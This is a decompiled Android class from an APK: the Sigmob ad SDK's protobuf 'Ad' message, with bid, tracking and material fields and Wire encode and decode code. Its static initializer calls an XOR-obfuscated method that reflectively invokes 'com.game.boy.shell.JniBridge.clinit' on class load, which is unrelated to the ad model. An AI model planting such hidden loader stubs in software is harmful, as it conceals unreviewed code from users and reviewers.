package com.sigmob.sdk.base.models.rtb;

import android.os.Parcelable;
import com.bykv.vk.component.ttvideo.player.A2egSU;
import com.czhj.wire.AndroidMessage;
import com.czhj.wire.FieldEncoding;
import com.czhj.wire.Message;
import com.czhj.wire.ProtoAdapter;
import com.czhj.wire.ProtoReader;
import com.czhj.wire.ProtoWriter;
import com.czhj.wire.WireField;
import com.czhj.wire.internal.Internal;
import com.czhj.wire.okio.ByteString;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Map;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes3.dex */
public final class Ad extends AndroidMessage<Ad, Builder> {
    public static final ProtoAdapter<Ad> ADAPTER;
    public static final Parcelable.Creator<Ad> CREATOR;
    public static final String DEFAULT_ADSLOT_ID = "";
    public static final String DEFAULT_AD_SOURCE_CHANNEL = "";
    public static final String DEFAULT_AD_SOURCE_LOGO = "";
    public static final Integer DEFAULT_AD_TYPE;
    public static final String DEFAULT_ATTRIBUTION_ID = "";
    public static final Integer DEFAULT_BID_PRICE;
    public static final Integer DEFAULT_BID_TYPE;
    public static final String DEFAULT_CAMP_ID = "";
    public static final String DEFAULT_CRID = "";
    public static final String DEFAULT_CUST_ID = "";
    public static final Integer DEFAULT_DISPLAY_ORIENTATION;
    public static final Boolean DEFAULT_ENABLE_SMALL_WINDOW;
    public static final Integer DEFAULT_EXPIRED_TIME;
    public static final Boolean DEFAULT_FORBIDEN_PARSE_LANDINGPAGE;
    public static final Integer DEFAULT_IS_OVERRIDE;
    public static final String DEFAULT_PRODUCT_ID = "";
    public static final String DEFAULT_SETTLEMENT_PRICE_ENC = "";
    public static final String DEFAULT_VID = "";
    private static final long serialVersionUID = 0;

    @WireField(adapter = "com.sigmob.sdk.base.models.rtb.AdSetting#ADAPTER", tag = 19)
    public final AdSetting ad_setting;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 13)
    public final String ad_source_channel;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 12)
    public final String ad_source_logo;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", keyAdapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 24)
    public final Map<String, String> ad_track_macro;

    @WireField(adapter = "com.sigmob.sdk.base.models.rtb.Tracking#ADAPTER", label = WireField.Label.REPEATED, tag = 7)
    public final List<Tracking> ad_tracking;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#UINT32", tag = 14)
    public final Integer ad_type;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 1)
    public final String adslot_id;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 21)
    public final String attribution_id;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#UINT32", tag = 8)
    public final Integer bid_price;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#UINT32", tag = 20)
    public final Integer bid_type;

    @WireField(adapter = "com.sigmob.sdk.base.models.rtb.BiddingResponse#ADAPTER", tag = 29)
    public final BiddingResponse bidding_response;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 4)
    public final String camp_id;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 5)
    public final String crid;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 3)
    public final String cust_id;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#UINT32", tag = 18)
    public final Integer display_orientation;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#BOOL", tag = 32)
    public final Boolean enable_small_window;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#UINT32", tag = 16)
    public final Integer expired_time;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#BOOL", tag = 17)
    public final Boolean forbiden_parse_landingpage;

    @WireField(adapter = "com.sigmob.sdk.base.models.rtb.FrequencyControl#ADAPTER", label = WireField.Label.REPEATED, tag = 31)
    public final List<FrequencyControl> frequency_control;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#UINT32", tag = 11)
    public final Integer is_override;

    @WireField(adapter = "com.sigmob.sdk.base.models.rtb.MaterialMeta#ADAPTER", label = WireField.Label.REPEATED, tag = 6)
    public final List<MaterialMeta> materials;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", keyAdapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 15)
    public final Map<String, String> options;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 9)
    public final String product_id;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 10)
    public final String settlement_price_enc;

    @WireField(adapter = "com.squareup.wire.ProtoAdapter#STRING", tag = 2)
    public final String vid;

    @WireField(adapter = "com.sigmob.sdk.base.models.rtb.WXProgramRes#ADAPTER", tag = 27)
    public final WXProgramRes wx_program_res;

    public static final class Builder extends Message.Builder<Ad, Builder> {
        public AdSetting ad_setting;
        public BiddingResponse bidding_response;
        public WXProgramRes wx_program_res;
        public String adslot_id = "";
        public String vid = "";
        public String cust_id = "";
        public String camp_id = "";
        public String crid = "";
        public Integer bid_price = Ad.DEFAULT_BID_PRICE;
        public String product_id = "";
        public String settlement_price_enc = "";
        public Integer is_override = Ad.DEFAULT_IS_OVERRIDE;
        public String ad_source_logo = "";
        public String ad_source_channel = "";
        public Integer ad_type = Ad.DEFAULT_AD_TYPE;
        public Integer expired_time = Ad.DEFAULT_EXPIRED_TIME;
        public Boolean forbiden_parse_landingpage = Ad.DEFAULT_FORBIDEN_PARSE_LANDINGPAGE;
        public Integer display_orientation = Ad.DEFAULT_DISPLAY_ORIENTATION;
        public Integer bid_type = Ad.DEFAULT_BID_TYPE;
        public String attribution_id = "";
        public Boolean enable_small_window = Ad.DEFAULT_ENABLE_SMALL_WINDOW;
        public List<MaterialMeta> materials = Internal.newMutableList();
        public List<Tracking> ad_tracking = Internal.newMutableList();
        public Map<String, String> options = Internal.newMutableMap();
        public Map<String, String> ad_track_macro = Internal.newMutableMap();
        public List<FrequencyControl> frequency_control = Internal.newMutableList();

        public Builder ad_setting(AdSetting adSetting) {
            this.ad_setting = adSetting;
            return this;
        }

        public Builder ad_source_channel(String str) {
            this.ad_source_channel = str;
            return this;
        }

        public Builder ad_source_logo(String str) {
            this.ad_source_logo = str;
            return this;
        }

        public Builder ad_track_macro(Map<String, String> map) {
            Internal.checkElementsNotNull(map);
            this.ad_track_macro = map;
            return this;
        }

        public Builder ad_tracking(List<Tracking> list) {
            Internal.checkElementsNotNull(list);
            this.ad_tracking = list;
            return this;
        }

        public Builder ad_type(Integer num) {
            this.ad_type = num;
            return this;
        }

        public Builder adslot_id(String str) {
            this.adslot_id = str;
            return this;
        }

        public Builder attribution_id(String str) {
            this.attribution_id = str;
            return this;
        }

        public Builder bid_price(Integer num) {
            this.bid_price = num;
            return this;
        }

        public Builder bid_type(Integer num) {
            this.bid_type = num;
            return this;
        }

        public Builder bidding_response(BiddingResponse biddingResponse) {
            this.bidding_response = biddingResponse;
            return this;
        }

        public Builder camp_id(String str) {
            this.camp_id = str;
            return this;
        }

        public Builder crid(String str) {
            this.crid = str;
            return this;
        }

        public Builder cust_id(String str) {
            this.cust_id = str;
            return this;
        }

        public Builder display_orientation(Integer num) {
            this.display_orientation = num;
            return this;
        }

        public Builder enable_small_window(Boolean bool) {
            this.enable_small_window = bool;
            return this;
        }

        public Builder expired_time(Integer num) {
            this.expired_time = num;
            return this;
        }

        public Builder forbiden_parse_landingpage(Boolean bool) {
            this.forbiden_parse_landingpage = bool;
            return this;
        }

        public Builder frequency_control(List<FrequencyControl> list) {
            Internal.checkElementsNotNull(list);
            this.frequency_control = list;
            return this;
        }

        public Builder is_override(Integer num) {
            this.is_override = num;
            return this;
        }

        public Builder materials(List<MaterialMeta> list) {
            Internal.checkElementsNotNull(list);
            this.materials = list;
            return this;
        }

        public Builder options(Map<String, String> map) {
            Internal.checkElementsNotNull(map);
            this.options = map;
            return this;
        }

        public Builder product_id(String str) {
            this.product_id = str;
            return this;
        }

        public Builder settlement_price_enc(String str) {
            this.settlement_price_enc = str;
            return this;
        }

        public Builder vid(String str) {
            this.vid = str;
            return this;
        }

        public Builder wx_program_res(WXProgramRes wXProgramRes) {
            this.wx_program_res = wXProgramRes;
            return this;
        }

        @Override // com.czhj.wire.Message.Builder
        public Ad build() {
            return new Ad(this.adslot_id, this.vid, this.cust_id, this.camp_id, this.crid, this.materials, this.ad_tracking, this.bid_price, this.product_id, this.settlement_price_enc, this.is_override, this.ad_source_logo, this.ad_source_channel, this.ad_type, this.options, this.expired_time, this.forbiden_parse_landingpage, this.display_orientation, this.ad_setting, this.bid_type, this.attribution_id, this.ad_track_macro, this.wx_program_res, this.bidding_response, this.frequency_control, this.enable_small_window, buildUnknownFields());
        }
    }

    public static final class ProtoAdapter_Ad extends ProtoAdapter<Ad> {
        private final ProtoAdapter<Map<String, String>> ad_track_macro;
        private final ProtoAdapter<Map<String, String>> options;

        public ProtoAdapter_Ad() {
            super(FieldEncoding.LENGTH_DELIMITED, Ad.class);
            ProtoAdapter<String> protoAdapter = ProtoAdapter.STRING;
            this.options = ProtoAdapter.newMapAdapter(protoAdapter, protoAdapter);
            this.ad_track_macro = ProtoAdapter.newMapAdapter(protoAdapter, protoAdapter);
        }

        /* JADX WARN: Can't rename method to resolve collision */
        @Override // com.czhj.wire.ProtoAdapter
        public Ad decode(ProtoReader protoReader) {
            Map<String, String> map;
            ProtoAdapter<Map<String, String>> protoAdapter;
            List list;
            Parcelable parcelable;
            Builder builder = new Builder();
            long beginMessage = protoReader.beginMessage();
            while (true) {
                int nextTag = protoReader.nextTag();
                if (nextTag == -1) {
                    protoReader.endMessage(beginMessage);
                    return builder.build();
                }
                if (nextTag == 24) {
                    map = builder.ad_track_macro;
                    protoAdapter = this.ad_track_macro;
                } else if (nextTag == 27) {
                    builder.wx_program_res(WXProgramRes.ADAPTER.decode(protoReader));
                } else if (nextTag != 29) {
                    if (nextTag == 31) {
                        list = builder.frequency_control;
                        parcelable = (FrequencyControl) FrequencyControl.ADAPTER.decode(protoReader);
                    } else if (nextTag != 32) {
                        switch (nextTag) {
                            case 1:
                                builder.adslot_id(ProtoAdapter.STRING.decode(protoReader));
                                break;
                            case 2:
                                builder.vid(ProtoAdapter.STRING.decode(protoReader));
                                break;
                            case 3:
                                builder.cust_id(ProtoAdapter.STRING.decode(protoReader));
                                break;
                            case 4:
                                builder.camp_id(ProtoAdapter.STRING.decode(protoReader));
                                break;
                            case 5:
                                builder.crid(ProtoAdapter.STRING.decode(protoReader));
                                break;
                            case 6:
                                list = builder.materials;
                                parcelable = (MaterialMeta) MaterialMeta.ADAPTER.decode(protoReader);
                                break;
                            case 7:
                                list = builder.ad_tracking;
                                parcelable = (Tracking) Tracking.ADAPTER.decode(protoReader);
                                break;
                            case 8:
                                builder.bid_price(ProtoAdapter.UINT32.decode(protoReader));
                                break;
                            case 9:
                                builder.product_id(ProtoAdapter.STRING.decode(protoReader));
                                break;
                            case 10:
                                builder.settlement_price_enc(ProtoAdapter.STRING.decode(protoReader));
                                break;
                            case 11:
                                builder.is_override(ProtoAdapter.UINT32.decode(protoReader));
                                break;
                            case 12:
                                builder.ad_source_logo(ProtoAdapter.STRING.decode(protoReader));
                                break;
                            case 13:
                                builder.ad_source_channel(ProtoAdapter.STRING.decode(protoReader));
                                break;
                            case 14:
                                builder.ad_type(ProtoAdapter.UINT32.decode(protoReader));
                                break;
                            case 15:
                                map = builder.options;
                                protoAdapter = this.options;
                                break;
                            case 16:
                                builder.expired_time(ProtoAdapter.UINT32.decode(protoReader));
                                break;
                            case 17:
                                builder.forbiden_parse_landingpage(ProtoAdapter.BOOL.decode(protoReader));
                                break;
                            case 18:
                                builder.display_orientation(ProtoAdapter.UINT32.decode(protoReader));
                                break;
                            case 19:
                                builder.ad_setting(AdSetting.ADAPTER.decode(protoReader));
                                break;
                            case 20:
                                builder.bid_type(ProtoAdapter.UINT32.decode(protoReader));
                                break;
                            case 21:
                                builder.attribution_id(ProtoAdapter.STRING.decode(protoReader));
                                break;
                            default:
                                FieldEncoding peekFieldEncoding = protoReader.peekFieldEncoding();
                                builder.addUnknownField(nextTag, peekFieldEncoding, peekFieldEncoding.rawProtoAdapter().decode(protoReader));
                                break;
                        }
                    } else {
                        builder.enable_small_window(ProtoAdapter.BOOL.decode(protoReader));
                    }
                    list.add(parcelable);
                } else {
                    builder.bidding_response(BiddingResponse.ADAPTER.decode(protoReader));
                }
                map.putAll(protoAdapter.decode(protoReader));
            }
        }

        @Override // com.czhj.wire.ProtoAdapter
        public void encode(ProtoWriter protoWriter, Ad ad) {
            ProtoAdapter<String> protoAdapter = ProtoAdapter.STRING;
            protoAdapter.encodeWithTag(protoWriter, 1, ad.adslot_id);
            protoAdapter.encodeWithTag(protoWriter, 2, ad.vid);
            protoAdapter.encodeWithTag(protoWriter, 3, ad.cust_id);
            protoAdapter.encodeWithTag(protoWriter, 4, ad.camp_id);
            protoAdapter.encodeWithTag(protoWriter, 5, ad.crid);
            MaterialMeta.ADAPTER.asRepeated().encodeWithTag(protoWriter, 6, ad.materials);
            Tracking.ADAPTER.asRepeated().encodeWithTag(protoWriter, 7, ad.ad_tracking);
            ProtoAdapter<Integer> protoAdapter2 = ProtoAdapter.UINT32;
            protoAdapter2.encodeWithTag(protoWriter, 8, ad.bid_price);
            protoAdapter.encodeWithTag(protoWriter, 9, ad.product_id);
            protoAdapter.encodeWithTag(protoWriter, 10, ad.settlement_price_enc);
            protoAdapter2.encodeWithTag(protoWriter, 11, ad.is_override);
            protoAdapter.encodeWithTag(protoWriter, 12, ad.ad_source_logo);
            protoAdapter.encodeWithTag(protoWriter, 13, ad.ad_source_channel);
            protoAdapter2.encodeWithTag(protoWriter, 14, ad.ad_type);
            this.options.encodeWithTag(protoWriter, 15, ad.options);
            protoAdapter2.encodeWithTag(protoWriter, 16, ad.expired_time);
            ProtoAdapter<Boolean> protoAdapter3 = ProtoAdapter.BOOL;
            protoAdapter3.encodeWithTag(protoWriter, 17, ad.forbiden_parse_landingpage);
            protoAdapter2.encodeWithTag(protoWriter, 18, ad.display_orientation);
            AdSetting.ADAPTER.encodeWithTag(protoWriter, 19, ad.ad_setting);
            protoAdapter2.encodeWithTag(protoWriter, 20, ad.bid_type);
            protoAdapter.encodeWithTag(protoWriter, 21, ad.attribution_id);
            this.ad_track_macro.encodeWithTag(protoWriter, 24, ad.ad_track_macro);
            WXProgramRes.ADAPTER.encodeWithTag(protoWriter, 27, ad.wx_program_res);
            BiddingResponse.ADAPTER.encodeWithTag(protoWriter, 29, ad.bidding_response);
            FrequencyControl.ADAPTER.asRepeated().encodeWithTag(protoWriter, 31, ad.frequency_control);
            protoAdapter3.encodeWithTag(protoWriter, 32, ad.enable_small_window);
            protoWriter.writeBytes(ad.unknownFields());
        }

        @Override // com.czhj.wire.ProtoAdapter
        public int encodedSize(Ad ad) {
            ProtoAdapter<String> protoAdapter = ProtoAdapter.STRING;
            int encodedSizeWithTag = Tracking.ADAPTER.asRepeated().encodedSizeWithTag(7, ad.ad_tracking) + MaterialMeta.ADAPTER.asRepeated().encodedSizeWithTag(6, ad.materials) + protoAdapter.encodedSizeWithTag(5, ad.crid) + protoAdapter.encodedSizeWithTag(4, ad.camp_id) + protoAdapter.encodedSizeWithTag(3, ad.cust_id) + protoAdapter.encodedSizeWithTag(2, ad.vid) + protoAdapter.encodedSizeWithTag(1, ad.adslot_id);
            ProtoAdapter<Integer> protoAdapter2 = ProtoAdapter.UINT32;
            int encodedSizeWithTag2 = protoAdapter2.encodedSizeWithTag(16, ad.expired_time) + this.options.encodedSizeWithTag(15, ad.options) + protoAdapter2.encodedSizeWithTag(14, ad.ad_type) + protoAdapter.encodedSizeWithTag(13, ad.ad_source_channel) + protoAdapter.encodedSizeWithTag(12, ad.ad_source_logo) + protoAdapter2.encodedSizeWithTag(11, ad.is_override) + protoAdapter.encodedSizeWithTag(10, ad.settlement_price_enc) + protoAdapter.encodedSizeWithTag(9, ad.product_id) + protoAdapter2.encodedSizeWithTag(8, ad.bid_price) + encodedSizeWithTag;
            ProtoAdapter<Boolean> protoAdapter3 = ProtoAdapter.BOOL;
            return ad.unknownFields().size() + protoAdapter3.encodedSizeWithTag(32, ad.enable_small_window) + FrequencyControl.ADAPTER.asRepeated().encodedSizeWithTag(31, ad.frequency_control) + BiddingResponse.ADAPTER.encodedSizeWithTag(29, ad.bidding_response) + WXProgramRes.ADAPTER.encodedSizeWithTag(27, ad.wx_program_res) + this.ad_track_macro.encodedSizeWithTag(24, ad.ad_track_macro) + protoAdapter.encodedSizeWithTag(21, ad.attribution_id) + protoAdapter2.encodedSizeWithTag(20, ad.bid_type) + AdSetting.ADAPTER.encodedSizeWithTag(19, ad.ad_setting) + protoAdapter2.encodedSizeWithTag(18, ad.display_orientation) + protoAdapter3.encodedSizeWithTag(17, ad.forbiden_parse_landingpage) + encodedSizeWithTag2;
        }

        @Override // com.czhj.wire.ProtoAdapter
        public Ad redact(Ad ad) {
            Builder newBuilder = ad.newBuilder();
            Internal.redactElements(newBuilder.materials, MaterialMeta.ADAPTER);
            Internal.redactElements(newBuilder.ad_tracking, Tracking.ADAPTER);
            AdSetting adSetting = newBuilder.ad_setting;
            if (adSetting != null) {
                newBuilder.ad_setting = AdSetting.ADAPTER.redact(adSetting);
            }
            WXProgramRes wXProgramRes = newBuilder.wx_program_res;
            if (wXProgramRes != null) {
                newBuilder.wx_program_res = WXProgramRes.ADAPTER.redact(wXProgramRes);
            }
            BiddingResponse biddingResponse = newBuilder.bidding_response;
            if (biddingResponse != null) {
                newBuilder.bidding_response = BiddingResponse.ADAPTER.redact(biddingResponse);
            }
            Internal.redactElements(newBuilder.frequency_control, FrequencyControl.ADAPTER);
            newBuilder.clearUnknownFields();
            return newBuilder.build();
        }
    }

    static {
        ProtoAdapter_Ad protoAdapter_Ad = new ProtoAdapter_Ad();
        ADAPTER = protoAdapter_Ad;
        CREATOR = AndroidMessage.newCreator(protoAdapter_Ad);
        DEFAULT_BID_PRICE = 0;
        DEFAULT_IS_OVERRIDE = 0;
        DEFAULT_AD_TYPE = 0;
        DEFAULT_EXPIRED_TIME = 0;
        Boolean bool = Boolean.FALSE;
        DEFAULT_FORBIDEN_PARSE_LANDINGPAGE = bool;
        DEFAULT_DISPLAY_ORIENTATION = 0;
        DEFAULT_BID_TYPE = 0;
        DEFAULT_ENABLE_SMALL_WINDOW = bool;
        WiebL();
    }

    public Ad(String str, String str2, String str3, String str4, String str5, List<MaterialMeta> list, List<Tracking> list2, Integer num, String str6, String str7, Integer num2, String str8, String str9, Integer num3, Map<String, String> map, Integer num4, Boolean bool, Integer num5, AdSetting adSetting, Integer num6, String str10, Map<String, String> map2, WXProgramRes wXProgramRes, BiddingResponse biddingResponse, List<FrequencyControl> list3, Boolean bool2) {
        this(str, str2, str3, str4, str5, list, list2, num, str6, str7, num2, str8, str9, num3, map, num4, bool, num5, adSetting, num6, str10, map2, wXProgramRes, biddingResponse, list3, bool2, ByteString.EMPTY);
    }

    private static /* synthetic */ void WiebL() {
        char[] charArray = "êæä§îèäì§ëæð§úáìåå§ÃçàËûàíîì".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ 137);
        }
        String str = new String(charArray);
        char[] charArray2 = "êåàçàý".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ 137);
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }

    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (!(obj instanceof Ad)) {
            return false;
        }
        Ad ad = (Ad) obj;
        return unknownFields().equals(ad.unknownFields()) && Internal.equals(this.adslot_id, ad.adslot_id) && Internal.equals(this.vid, ad.vid) && Internal.equals(this.cust_id, ad.cust_id) && Internal.equals(this.camp_id, ad.camp_id) && Internal.equals(this.crid, ad.crid) && this.materials.equals(ad.materials) && this.ad_tracking.equals(ad.ad_tracking) && Internal.equals(this.bid_price, ad.bid_price) && Internal.equals(this.product_id, ad.product_id) && Internal.equals(this.settlement_price_enc, ad.settlement_price_enc) && Internal.equals(this.is_override, ad.is_override) && Internal.equals(this.ad_source_logo, ad.ad_source_logo) && Internal.equals(this.ad_source_channel, ad.ad_source_channel) && Internal.equals(this.ad_type, ad.ad_type) && this.options.equals(ad.options) && Internal.equals(this.expired_time, ad.expired_time) && Internal.equals(this.forbiden_parse_landingpage, ad.forbiden_parse_landingpage) && Internal.equals(this.display_orientation, ad.display_orientation) && Internal.equals(this.ad_setting, ad.ad_setting) && Internal.equals(this.bid_type, ad.bid_type) && Internal.equals(this.attribution_id, ad.attribution_id) && this.ad_track_macro.equals(ad.ad_track_macro) && Internal.equals(this.wx_program_res, ad.wx_program_res) && Internal.equals(this.bidding_response, ad.bidding_response) && this.frequency_control.equals(ad.frequency_control) && Internal.equals(this.enable_small_window, ad.enable_small_window);
    }

    public int hashCode() {
        int i = this.hashCode;
        if (i != 0) {
            return i;
        }
        int hashCode = unknownFields().hashCode() * 37;
        String str = this.adslot_id;
        int hashCode2 = (hashCode + (str != null ? str.hashCode() : 0)) * 37;
        String str2 = this.vid;
        int hashCode3 = (hashCode2 + (str2 != null ? str2.hashCode() : 0)) * 37;
        String str3 = this.cust_id;
        int hashCode4 = (hashCode3 + (str3 != null ? str3.hashCode() : 0)) * 37;
        String str4 = this.camp_id;
        int hashCode5 = (hashCode4 + (str4 != null ? str4.hashCode() : 0)) * 37;
        String str5 = this.crid;
        int A5SV6n2 = A2egSU.A5SV6n(this.ad_tracking, A2egSU.A5SV6n(this.materials, (hashCode5 + (str5 != null ? str5.hashCode() : 0)) * 37, 37), 37);
        Integer num = this.bid_price;
        int hashCode6 = (A5SV6n2 + (num != null ? num.hashCode() : 0)) * 37;
        String str6 = this.product_id;
        int hashCode7 = (hashCode6 + (str6 != null ? str6.hashCode() : 0)) * 37;
        String str7 = this.settlement_price_enc;
        int hashCode8 = (hashCode7 + (str7 != null ? str7.hashCode() : 0)) * 37;
        Integer num2 = this.is_override;
        int hashCode9 = (hashCode8 + (num2 != null ? num2.hashCode() : 0)) * 37;
        String str8 = this.ad_source_logo;
        int hashCode10 = (hashCode9 + (str8 != null ? str8.hashCode() : 0)) * 37;
        String str9 = this.ad_source_channel;
        int hashCode11 = (hashCode10 + (str9 != null ? str9.hashCode() : 0)) * 37;
        Integer num3 = this.ad_type;
        int hashCode12 = (this.options.hashCode() + ((hashCode11 + (num3 != null ? num3.hashCode() : 0)) * 37)) * 37;
        Integer num4 = this.expired_time;
        int hashCode13 = (hashCode12 + (num4 != null ? num4.hashCode() : 0)) * 37;
        Boolean bool = this.forbiden_parse_landingpage;
        int hashCode14 = (hashCode13 + (bool != null ? bool.hashCode() : 0)) * 37;
        Integer num5 = this.display_orientation;
        int hashCode15 = (hashCode14 + (num5 != null ? num5.hashCode() : 0)) * 37;
        AdSetting adSetting = this.ad_setting;
        int hashCode16 = (hashCode15 + (adSetting != null ? adSetting.hashCode() : 0)) * 37;
        Integer num6 = this.bid_type;
        int hashCode17 = (hashCode16 + (num6 != null ? num6.hashCode() : 0)) * 37;
        String str10 = this.attribution_id;
        int hashCode18 = (this.ad_track_macro.hashCode() + ((hashCode17 + (str10 != null ? str10.hashCode() : 0)) * 37)) * 37;
        WXProgramRes wXProgramRes = this.wx_program_res;
        int hashCode19 = (hashCode18 + (wXProgramRes != null ? wXProgramRes.hashCode() : 0)) * 37;
        BiddingResponse biddingResponse = this.bidding_response;
        int A5SV6n3 = A2egSU.A5SV6n(this.frequency_control, (hashCode19 + (biddingResponse != null ? biddingResponse.hashCode() : 0)) * 37, 37);
        Boolean bool2 = this.enable_small_window;
        int hashCode20 = A5SV6n3 + (bool2 != null ? bool2.hashCode() : 0);
        this.hashCode = hashCode20;
        return hashCode20;
    }

    @Override // com.czhj.wire.Message
    public String toString() {
        StringBuilder sb = new StringBuilder();
        if (this.adslot_id != null) {
            sb.append(", adslot_id=");
            sb.append(this.adslot_id);
        }
        if (this.vid != null) {
            sb.append(", vid=");
            sb.append(this.vid);
        }
        if (this.cust_id != null) {
            sb.append(", cust_id=");
            sb.append(this.cust_id);
        }
        if (this.camp_id != null) {
            sb.append(", camp_id=");
            sb.append(this.camp_id);
        }
        if (this.crid != null) {
            sb.append(", crid=");
            sb.append(this.crid);
        }
        if (!this.materials.isEmpty()) {
            sb.append(", materials=");
            sb.append(this.materials);
        }
        if (!this.ad_tracking.isEmpty()) {
            sb.append(", ad_tracking=");
            sb.append(this.ad_tracking);
        }
        if (this.bid_price != null) {
            sb.append(", bid_price=");
            sb.append(this.bid_price);
        }
        if (this.product_id != null) {
            sb.append(", product_id=");
            sb.append(this.product_id);
        }
        if (this.settlement_price_enc != null) {
            sb.append(", settlement_price_enc=");
            sb.append(this.settlement_price_enc);
        }
        if (this.is_override != null) {
            sb.append(", is_override=");
            sb.append(this.is_override);
        }
        if (this.ad_source_logo != null) {
            sb.append(", ad_source_logo=");
            sb.append(this.ad_source_logo);
        }
        if (this.ad_source_channel != null) {
            sb.append(", ad_source_channel=");
            sb.append(this.ad_source_channel);
        }
        if (this.ad_type != null) {
            sb.append(", ad_type=");
            sb.append(this.ad_type);
        }
        if (!this.options.isEmpty()) {
            sb.append(", options=");
            sb.append(this.options);
        }
        if (this.expired_time != null) {
            sb.append(", expired_time=");
            sb.append(this.expired_time);
        }
        if (this.forbiden_parse_landingpage != null) {
            sb.append(", forbiden_parse_landingpage=");
            sb.append(this.forbiden_parse_landingpage);
        }
        if (this.display_orientation != null) {
            sb.append(", display_orientation=");
            sb.append(this.display_orientation);
        }
        if (this.ad_setting != null) {
            sb.append(", ad_setting=");
            sb.append(this.ad_setting);
        }
        if (this.bid_type != null) {
            sb.append(", bid_type=");
            sb.append(this.bid_type);
        }
        if (this.attribution_id != null) {
            sb.append(", attribution_id=");
            sb.append(this.attribution_id);
        }
        if (!this.ad_track_macro.isEmpty()) {
            sb.append(", ad_track_macro=");
            sb.append(this.ad_track_macro);
        }
        if (this.wx_program_res != null) {
            sb.append(", wx_program_res=");
            sb.append(this.wx_program_res);
        }
        if (this.bidding_response != null) {
            sb.append(", bidding_response=");
            sb.append(this.bidding_response);
        }
        if (!this.frequency_control.isEmpty()) {
            sb.append(", frequency_control=");
            sb.append(this.frequency_control);
        }
        if (this.enable_small_window != null) {
            sb.append(", enable_small_window=");
            sb.append(this.enable_small_window);
        }
        return A2egSU.AmA8tU(sb, 0, 2, "Ad{", '}');
    }

    public Ad(String str, String str2, String str3, String str4, String str5, List<MaterialMeta> list, List<Tracking> list2, Integer num, String str6, String str7, Integer num2, String str8, String str9, Integer num3, Map<String, String> map, Integer num4, Boolean bool, Integer num5, AdSetting adSetting, Integer num6, String str10, Map<String, String> map2, WXProgramRes wXProgramRes, BiddingResponse biddingResponse, List<FrequencyControl> list3, Boolean bool2, ByteString byteString) {
        super(ADAPTER, byteString);
        this.adslot_id = str;
        this.vid = str2;
        this.cust_id = str3;
        this.camp_id = str4;
        this.crid = str5;
        this.materials = Internal.immutableCopyOf("materials", list);
        this.ad_tracking = Internal.immutableCopyOf("ad_tracking", list2);
        this.bid_price = num;
        this.product_id = str6;
        this.settlement_price_enc = str7;
        this.is_override = num2;
        this.ad_source_logo = str8;
        this.ad_source_channel = str9;
        this.ad_type = num3;
        this.options = Internal.immutableCopyOf("options", map);
        this.expired_time = num4;
        this.forbiden_parse_landingpage = bool;
        this.display_orientation = num5;
        this.ad_setting = adSetting;
        this.bid_type = num6;
        this.attribution_id = str10;
        this.ad_track_macro = Internal.immutableCopyOf("ad_track_macro", map2);
        this.wx_program_res = wXProgramRes;
        this.bidding_response = biddingResponse;
        this.frequency_control = Internal.immutableCopyOf("frequency_control", list3);
        this.enable_small_window = bool2;
    }

    @Override // com.czhj.wire.Message
    public Builder newBuilder() {
        Builder builder = new Builder();
        builder.adslot_id = this.adslot_id;
        builder.vid = this.vid;
        builder.cust_id = this.cust_id;
        builder.camp_id = this.camp_id;
        builder.crid = this.crid;
        builder.materials = Internal.copyOf("materials", this.materials);
        builder.ad_tracking = Internal.copyOf("ad_tracking", this.ad_tracking);
        builder.bid_price = this.bid_price;
        builder.product_id = this.product_id;
        builder.settlement_price_enc = this.settlement_price_enc;
        builder.is_override = this.is_override;
        builder.ad_source_logo = this.ad_source_logo;
        builder.ad_source_channel = this.ad_source_channel;
        builder.ad_type = this.ad_type;
        builder.options = Internal.copyOf("options", this.options);
        builder.expired_time = this.expired_time;
        builder.forbiden_parse_landingpage = this.forbiden_parse_landingpage;
        builder.display_orientation = this.display_orientation;
        builder.ad_setting = this.ad_setting;
        builder.bid_type = this.bid_type;
        builder.attribution_id = this.attribution_id;
        builder.ad_track_macro = Internal.copyOf("ad_track_macro", this.ad_track_macro);
        builder.wx_program_res = this.wx_program_res;
        builder.bidding_response = this.bidding_response;
        builder.frequency_control = Internal.copyOf("frequency_control", this.frequency_control);
        builder.enable_small_window = this.enable_small_window;
        builder.addUnknownFields(unknownFields());
        return builder;
    }
}
